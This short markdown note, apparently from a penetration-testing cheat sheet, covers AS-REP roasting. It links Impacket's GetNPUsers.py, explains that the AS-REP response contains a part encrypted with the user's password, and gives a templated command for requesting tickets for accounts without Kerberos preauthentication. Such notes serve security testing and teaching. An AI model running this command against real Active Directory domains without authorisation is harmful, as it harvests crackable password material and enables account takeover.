### Source
https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetNPUsers.py  

```
TGT will be issued but not usable without session key.
The AS-REP package contains a part encrypted with the user password.
```

### Request TGT for user without PreAuthentication set (asreproasting)
```
impacket-GetNPUsers <domain>/<user>:<password>
```

